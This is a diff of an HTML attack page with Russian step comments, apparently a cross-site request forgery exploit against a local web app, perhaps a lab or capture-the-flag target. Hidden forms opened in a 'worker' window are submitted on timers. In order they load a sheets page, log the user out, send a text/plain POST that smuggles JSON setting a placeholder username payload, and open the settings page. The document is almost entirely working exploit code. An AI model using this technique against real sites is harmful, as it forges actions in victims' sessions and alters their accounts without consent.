@@ -2,37 +2,29 @@
 <html>
 <body>
 
-  <iframe name="worker" id="worker" src="http://localhost:8000/#/sheets"></iframe>
+  <!-- Шаг 1: GET /#/sheets -->
+  <form id="f1" target="worker" action="http://localhost:8000/#/sheets" method="GET"></form>
 
-  <form id="f_logout" target="worker"
-        action="http://localhost:8000/api/logout"
-        method="GET">
-  </form>
+  <!-- Шаг 2: GET /api/logout -->
+  <form id="f2" target="worker" action="http://localhost:8000/api/logout" method="GET"></form>
 
-  <form id="f_whoami" target="worker"
-        action="http://localhost:8000/api/whoami"
-        method="POST"
-        enctype="text/plain">
+  <!-- Шаг 3: POST /api/whoami -->
+  <form id="f3" target="worker" action="http://localhost:8000/api/whoami" 
+        method="POST" enctype="text/plain">
     <input name='{"new_username":"PAYLOAD' value='HERE"}'>
   </form>
 
-  <form id="f_settings" target="worker"
-        action="http://localhost:8000/#/settings"
-        method="GET">
-  </form>
+  <!-- Шаг 4: GET /#/settings -->
+  <form id="f4" target="worker" action="http://localhost:8000/#/settings" method="GET"></form>
 
   <script>
-    setTimeout(function() {
-      document.getElementById('f_logout').submit();
+    // Открываем вкладку один раз
+    window.open('', 'worker');
 
-      setTimeout(function() {
-        document.getElementById('f_whoami').submit();
-
-        setTimeout(function() {
-          document.getElementById('f_settings').submit();
-        }, 2000);
-      }, 2000);
-    }, 3000);
+    setTimeout(() => { document.getElementById('f1').submit(); }, 2000);
+    setTimeout(() => { document.getElementById('f2').submit(); }, 4000);
+    setTimeout(() => { document.getElementById('f3').submit(); }, 6000);
+    setTimeout(() => { document.getElementById('f4').submit(); }, 8000);
   </script>
 
 </body>
